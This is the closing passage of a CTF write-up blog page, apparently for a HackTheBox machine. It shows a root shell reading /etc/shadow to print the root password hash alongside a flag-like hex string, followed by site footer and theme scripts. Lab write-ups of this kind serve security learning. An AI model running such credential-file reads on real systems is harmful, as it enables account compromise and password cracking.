</span></span><span class=line><span class=cl>44f998eb5112e763883b6ae36279a432
</span></span><span class=line><span class=cl>root@ae6411b77a1e:~# cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$bWa.Lbnz$k0KbMyNbdOQRcY5pWuHM2bfkF5ek8c0CTNsi00qFHmp04NqcefCsIXZTdJgqToRar5zcEk5k8KFhbIomGB3Kb/:18178:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>